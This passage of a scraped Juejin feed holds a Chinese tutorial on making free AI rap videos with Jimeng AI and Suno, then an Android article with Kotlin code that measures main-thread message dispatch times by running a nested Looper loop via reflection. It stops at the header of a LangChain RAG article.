                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>不用花钱，不用技术，小白也能轻松搞定</p>
</blockquote>
<p>大家好，我是磊哥！今天给大家分享一个超级实用的干货——<strong>如何免费制作AI说唱视频</strong>！</p>
<p>先来看看效果：</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1JVUCBVEsL%2F" target="_blank" title="https://www.bilibili.com/video/BV1JVUCBVEsL/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1JV…</a></p>
<p>是不是很有意思？而且<strong>这一切都是AI自动生成的</strong>，操作简单到让你不敢相信！</p>
<h2 data-id="heading-0">💡 为什么这个玩法能火？</h2>
<ul>
<li><strong>反差感强</strong>：古代人物唱现代说唱。</li>
<li><strong>趣味性足</strong>：搞笑歌词+对口型表演。</li>
<li><strong>制作简单</strong>：3步搞定，全程免费。</li>
<li><strong>传播性强</strong>：30秒短视频，适合各大平台。</li>
</ul>
<h2 data-id="heading-1">🚀 三步制作教程（全程免费）</h2>
<h3 data-id="heading-2">第一步：生成人物图片</h3>
<p><strong>工具</strong>：即梦AI</p>
<p><strong>操作</strong>：</p>
<ul>
<li>打开即梦AI（<a href="https://link.juejin.cn?target=https%3A%2F%2Fjimeng.jianying.com%2F%25EF%25BC%2589%25EF%25BC%258C%25E8%25BF%259B%25E5%2585%25A5%2522%25E7%2594%259F%25E5%259B%25BE%2522%25E5%258A%259F%25E8%2583%25BD" target="_blank" title="https://jimeng.jianying.com/%EF%BC%89%EF%BC%8C%E8%BF%9B%E5%85%A5%22%E7%94%9F%E5%9B%BE%22%E5%8A%9F%E8%83%BD" ref="nofollow noopener noreferrer">jimeng.jianying.com/），进入"生图"功能</a></li>
<li>输入你想要的人物描述</li>
<li><strong>技巧</strong>：尽量制造反差，比如古代人物现代装扮。</li>
<li><strong>成本</strong>：每天免费80积分，生成图片只需5-10积分。</li>
</ul>
<blockquote>
<p>提示词：生成许仙化带墨镜拿话筒唱歌的照片，古代和现代的融合与反差，穿古代绿白色衣服，带一个古代书生帽。</p>
</blockquote>
<h3 data-id="heading-3">第二步：生成说唱音乐</h3>
<p><strong>工具</strong>：Suno（原sercom）</p>
<p><strong>操作</strong>：</p>
<ul>
<li>访问网站：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.suno.com%2F%25EF%25BC%2588%25E9%259C%2580%25E9%25AD%2594%25E6%25B3%2595%25EF%25BC%2589%25E6%25B3%25A8%25E5%2586%258C%25E8%25B4%25A6%25E5%258F%25B7%25EF%25BC%2588%25E9%2582%25AE%25E7%25AE%25B1%25E5%258D%25B3%25E5%258F%25AF%25EF%25BC%2589" target="_blank" title="https://www.suno.com/%EF%BC%88%E9%9C%80%E9%AD%94%E6%B3%95%EF%BC%89%E6%B3%A8%E5%86%8C%E8%B4%A6%E5%8F%B7%EF%BC%88%E9%82%AE%E7%AE%B1%E5%8D%B3%E5%8F%AF%EF%BC%89" ref="nofollow noopener noreferrer">www.suno.com/（需魔法）注册账号（邮…</a></li>
<li>进入创作页面，输入提示词</li>
<li><strong>示例提示词</strong>："生成一首许仙的搞笑歌曲，只要高潮部分，时长30秒以内"</li>
<li>系统会生成4个版本，选择最满意的下载。</li>
<li><strong>成本</strong>：每天免费50积分，每首歌10积分。</li>
</ul>
<h3 data-id="heading-4">第三步：合成对口型视频</h3>
<p><strong>工具</strong>：即梦AI数字人功能。</p>
<p><strong>操作</strong>：</p>
<ul>
<li>回到即梦AI，找到"数字人"功能。</li>
<li>上传刚才生成的图片和音频。</li>
<li>点击生成，等待2-3分钟。</li>
<li><strong>成本</strong>：每次20积分。</li>
</ul>
<h2 data-id="heading-5">💰 免费额度完全够用</h2>
<ul>
<li><strong>即梦AI</strong>：每天80积分。
<ul>
<li>生成图片：5-10积分。</li>
<li>数字人合成：20积分。</li>
</ul>
</li>
<li><strong>Suno音乐</strong>：每天50积分。
<ul>
<li>每首歌：10积分。</li>
</ul>
</li>
</ul>
<p><strong>算一算</strong>：每天可以免费制作5个完整的说唱视频！</p>
<h2 data-id="heading-6">🎯 制作小贴士</h2>
<ol>
<li><strong>选题要新颖</strong>：古代人物+现代元素反差最受欢迎</li>
<li><strong>歌词要搞笑</strong>：轻松幽默的内容更容易传播</li>
<li><strong>时长要控制</strong>：30秒以内最适合短视频平台</li>
<li><strong>口型要对准</strong>：AI会自动对口型，效果很自然</li>
</ol>
<h2 data-id="heading-7">💥 为什么现在就要开始？</h2>
<ul>
<li><strong>红利期</strong>：AI视频制作刚刚兴起，竞争小。</li>
<li><strong>成本低</strong>：完全免费，零门槛。</li>
<li><strong>效果好</strong>：对口型自然，制作精良。</li>
<li><strong>变现快</strong>：适合抖音、快手、视频号等多个平台。</li>
</ul>
<h2 data-id="heading-8">🎉 行动起来！</h2>
<p>不要再观望了！趁着现在还是红利期，赶紧动手制作你的第一个AI说唱视频吧！</p>
<p>记住：<strong>创意+反差+免费工具=爆款视频</strong></p>
<p>我是磊哥，每天分享一个实用干货。如果你觉得这篇文章对你有帮助，记得点赞收藏，我们下期再见！</p>
<hr/>
<p><strong>立即行动</strong>：</p>
<ul>
<li>下载即梦AI</li>
<li>注册Suno账号</li>
<li>今天就开始制作你的第一个AI说唱视频！</li>
</ul>
<blockquote>
<p>机会永远留给行动的人，现在就开始吧！</p>
</blockquote>
<blockquote>
<p>本文已收录到我的技术小站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.javacn.site" target="_blank" title="https://www.javacn.site" ref="nofollow noopener noreferrer">www.javacn.site</a>，其中包含的内容有：Spring AI、Spring AI Alibaba、LangChain4j、Dify、Coze、N8N、智能体（AI Agent）、MCP、Function Call、RAG、向量数据库、Prompt、多模态、向量数据库、嵌入模型、AI 常见面试问题等内容。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何通过 Android 消息机制实现 Looper 的性能监控]]></title>    <link>https://juejin.cn/post/7576155969604878371</link>    <guid>https://juejin.cn/post/7576155969604878371</guid>    <pubDate>2025-11-24T15:01:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576155969604878371" data-draft-id="7576105458807357440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何通过 Android 消息机制实现 Looper 的性能监控"/> <meta itemprop="keywords" content="Android,性能优化,APP"/> <meta itemprop="datePublished" content="2025-11-24T15:01:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="apigfly"/> <meta itemprop="url" content="https://juejin.cn/user/2488950054453613"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何通过 Android 消息机制实现 Looper 的性能监控
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2488950054453613/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    apigfly
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T15:01:22.000Z" title="Mon Nov 24 2025 15:01:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>AGI 的时代真的是太棒啦～</p>
</blockquote>
<h2 data-id="heading-0">前言</h2>
<p>在 Android 开发中，<code>Handler</code>、<code>Looper</code>、<code>MessageQueue</code> 构成了整个应用消息机制的核心。而主线程执行耗时任务是 Android 想要极力避免的。</p>
<p>接下来，我们会基于消息机制，<strong>通过接管主线程 Loop 循环来无侵入地监控 UI 卡顿</strong></p>
<p>首先简单介绍消息机制的设计，如果需要详细的源码分析，可以看之前的文章 <a href="https://juejin.cn/post/6876710885801492487" target="_blank" title="https://juejin.cn/post/6876710885801492487">传送门</a></p>
<h2 data-id="heading-1">原理</h2>
<p>Android 的消息机制本质上是一个生产者-消费者模型</p>
<ul>
<li><code>Handler</code>: 消息的生产者（发送）与最终消费者（处理）</li>
<li><code>MessageQueue</code>: 消息队列（缓冲区），内部使用单链表结构维护消息，按执行时间排序。</li>
<li><code>Looper</code>: 动力泵，不断从 <code>MessageQueue</code> 中抽取消息。</li>
<li><code>Message</code>: 载体，持有数据和处理它的 <code>Handler</code> (target)。</li>
</ul>
<h3 data-id="heading-2">核心类图</h3>
<p>为了理清它们之间的持有关系，我们来看一下类图结构：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5d8c0b34e584d96aa0194a33b77bf1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXBpZ2ZseQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764601282&amp;x-signature=yBEMDngZPqbjNirtN6EzzlRmyF0%3D" alt="image.png" loading="lazy"/></p>
<p>说明：</p>
<ul>
<li><code>Looper</code> 也就是整个消息机制的“管家”，它拥有唯一的 <code>MessageQueue</code>。</li>
<li><code>Handler</code> 必须绑定到一个 <code>Looper</code> 上才能工作。</li>
<li><code>Message</code> 内部持有 <code>target</code> (即 <code>Handler</code>)，这样 <code>Looper</code> 取出消息后，知道该把它交给谁去处理。</li>
<li>一个线程只会对应一个 <code>Looper</code> 对象</li>
</ul>
<h3 data-id="heading-3">消息分发时序图</h3>
<p>当我们在子线程调用 <code>handler.sendMessage()</code> 时，整个系统是如何运转的？</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/239ea61d185a47ed8d7e933304989a1f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYXBpZ2ZseQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764601282&amp;x-signature=AxcrYg6jjzVLucrifeHeKtQPIH0%3D" alt="image.png" loading="lazy"/></p>
<p>关键点：</p>
<ul>
<li>入队 (<code>enqueueMessage</code>)：线程安全的将消息插入单链表。</li>
<li>出队 (<code>next</code>)：这是一个阻塞操作。如果队列为空或时间未到，利用 Linux 的 <code>epoll</code> 机制挂起线程，释放 CPU 资源。</li>
<li>分发 (<code>dispatchMessage</code>)：<code>Looper</code> 拿到消息后，直接调用 <code>msg.target</code> (即 <code>Handler</code>) 的方法在当前线程执行。</li>
</ul>
<blockquote>
<p>基础内容结束，接下来开始我们的实战</p>
</blockquote>
<h2 data-id="heading-4">实战</h2>
<p>在性能优化中，监控主线程卡顿（ANR）是重中之重。 通常我们使用 <code>Looper.getMainLooper().setMessageLogging(Printer)</code> 来监控，但这种方式会产生大量的字符串拼接，对性能有微弱影响。</p>
<p>这里介绍一种更底层、更激进的思路：<code>Looper 劫持</code></p>
<h3 data-id="heading-5">核心思路</h3>
<p>Android 主线程本质上就是在一个死循环中运行：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 原生 ActivityThread 逻辑简化</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
    Looper.prepareMainLooper();
    <span class="hljs-comment">// ...</span>
    Looper.loop(); <span class="hljs-comment">// &lt;--- 死循环，这里如果不退出，APP 就在运行中</span>
}
</code></pre>
<p><strong>如果我们向主线程发送一个消息，这个消息的 <code>Runnable</code> 内部也是一个死循环，会发生什么？</strong><br/>
答案是：主线程会被阻塞在这个消息里。</p>
<p>但是，如果我们在我们的死循环里，<strong>手动通过反射去调用 <code>MessageQueue.next()</code> 和 <code>Handler.dispatchMessage()</code>，我们就相当于在主线程原有的 Loop 里面嵌套了一个我们自己的 Loop。</strong></p>
<p>这样，我们既接管了消息分发权（可以轻松计算分发耗时），又没有让主线程瘫痪。</p>
<h3 data-id="heading-6">实现代码</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> android.<span class="hljs-keyword">annotation</span>.SuppressLint
<span class="hljs-keyword">import</span> android.os.Handler
<span class="hljs-keyword">import</span> android.os.Looper
<span class="hljs-keyword">import</span> android.os.Message
<span class="hljs-keyword">import</span> android.os.MessageQueue
<span class="hljs-keyword">import</span> android.util.Log
<span class="hljs-keyword">import</span> java.lang.reflect.Field
<span class="hljs-keyword">import</span> java.lang.reflect.Method

<span class="hljs-keyword">object</span> LooperMonitor {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> TAG = <span class="hljs-string">"LooperMonitor"</span>
    <span class="hljs-comment">// 阈值：超过 100ms 视为卡顿</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> BLOCK_THRESHOLD = <span class="hljs-number">100L</span>

    <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">startMonitor</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">val</span> mainHandler = Handler(Looper.getMainLooper())

        <span class="hljs-comment">// 向主线程发送一个“毒丸”消息，接管 Loop</span>
        mainHandler.post {
            hijackLooper()
        }
    }

    <span class="hljs-meta">@SuppressLint(<span class="hljs-string">"DiscouragedPrivateApi"</span>)</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">hijackLooper</span><span class="hljs-params">()</span></span> {
        Log.i(TAG, <span class="hljs-string">"Looper Hijack Started!"</span>)

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 1. 反射获取 MessageQueue</span>
            <span class="hljs-keyword">val</span> mainLooper = Looper.getMainLooper()
            <span class="hljs-keyword">val</span> queueField: Field = Looper::<span class="hljs-keyword">class</span>.java.getDeclaredField(<span class="hljs-string">"mQueue"</span>)
            queueField.isAccessible = <span class="hljs-literal">true</span>
            <span class="hljs-keyword">val</span> messageQueue = queueField.<span class="hljs-keyword">get</span>(mainLooper) <span class="hljs-keyword">as</span> MessageQueue

            <span class="hljs-comment">// 2. 反射获取 MessageQueue.next() 方法</span>
            <span class="hljs-keyword">val</span> nextMethod: Method = MessageQueue::<span class="hljs-keyword">class</span>.java.getDeclaredMethod(<span class="hljs-string">"next"</span>)
            nextMethod.isAccessible = <span class="hljs-literal">true</span>

            <span class="hljs-comment">// 3. 反射获取 Message.target 字段 (Handler)</span>
            <span class="hljs-keyword">val</span> targetField: Field = Message::<span class="hljs-keyword">class</span>.java.getDeclaredField(<span class="hljs-string">"target"</span>)
            targetField.isAccessible = <span class="hljs-literal">true</span>

            <span class="hljs-comment">// 4. 反射获取 Message.recycleUnchecked() 方法 (用于回收)</span>
            <span class="hljs-comment">// 注意：不同版本 API recycle 方法名可能不同，这里简化处理，或者直接不手动 recycle 等待系统处理</span>
            <span class="hljs-keyword">val</span> recycleMethod = Message::<span class="hljs-keyword">class</span>.java.getDeclaredMethod(<span class="hljs-string">"recycleUnchecked"</span>)
            recycleMethod.isAccessible = <span class="hljs-literal">true</span>

            <span class="hljs-comment">// 5. 开启我们自己的死循环，代替 Looper.loop()</span>
            <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
                <span class="hljs-comment">// 手动调用 next()，这里可能会阻塞，就像原生的 loop() 一样</span>
                <span class="hljs-keyword">val</span> msg = nextMethod.invoke(messageQueue) <span class="hljs-keyword">as</span>? Message ?: <span class="hljs-keyword">return</span>

                <span class="hljs-keyword">val</span> handler = targetField.<span class="hljs-keyword">get</span>(msg) <span class="hljs-keyword">as</span>? Handler

                <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) {
                    <span class="hljs-comment">// 没有 target 的消息通常意味着退出 loop，但在主线程一般不会遇到</span>
                    <span class="hljs-keyword">return</span>
                }

                <span class="hljs-comment">// --- 监控开始 ---</span>
                <span class="hljs-keyword">val</span> startTime = System.currentTimeMillis()

                <span class="hljs-comment">// 执行分发</span>
                handler.dispatchMessage(msg)

                <span class="hljs-comment">// --- 监控结束 ---</span>
                <span class="hljs-keyword">val</span> endTime = System.currentTimeMillis()
                <span class="hljs-keyword">val</span> cost = endTime - startTime

                <span class="hljs-keyword">if</span> (cost &gt; BLOCK_THRESHOLD) {
                    Log.w(TAG, <span class="hljs-string">"UI 卡顿检测: 耗时 <span class="hljs-subst">${cost}</span>ms | Target: <span class="hljs-subst">${handler.javaClass.name}</span>"</span>)
                    <span class="hljs-comment">// 此时可以抓取堆栈信息：Thread.currentThread().stackTrace</span>
                }

                <span class="hljs-comment">// 回收消息 (模拟 Looper.loop 的行为)</span>
                recycleMethod.invoke(msg)
            }
        } <span class="hljs-keyword">catch</span> (e: Exception) {
            Log.e(TAG, <span class="hljs-string">"Hijack failed"</span>, e)
            <span class="hljs-comment">// 如果出错了，最好抛出异常或者恢复现场，否则 App 可能 ANR</span>
        }
    }
}
</code></pre>
<p>正常情况下，我们可以从日志中看到</p>
<pre><code class="hljs language-log" lang="log">2025-11-24 21:43:20.402  7774-7774  LooperMonitor           com.hualee.myapplication             I  Looper Hijack Started!
2025-11-24 21:43:20.511  7774-7774  LooperMonitor           com.hualee.myapplication             W  UI 卡顿检测: 耗时 108ms | Target: android.app.ActivityThread$H
2025-11-24 21:43:20.733  7774-7774  LooperMonitor           com.hualee.myapplication             W  UI 卡顿检测: 耗时 222ms | Target: android.view.Choreographer$FrameHandler

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[LangChain×Qwen3：高性能RAG系统实战项目]]></title>    <link>https://juejin.cn/post/7576273949178183743</link>    <guid>https://juejin.cn/post/7576273949178183743</guid>    <pubDate>2025-11-24T13:04:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576273949178183743" data-draft-id="7576129509934628883" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="LangChain×Qwen3：高性能RAG系统实战项目"/> <meta itemprop="keywords" content="LangChain,LLM,程序员"/> <meta itemprop="datePublished" content="2025-11-24T13:04:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="大模型教程"/> <meta itemprop="url" content="https://juejin.cn/user/1145012233707299"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            LangChain×Qwen3：高性能RAG系统实战项目
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1145012233707299/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    大模型教程
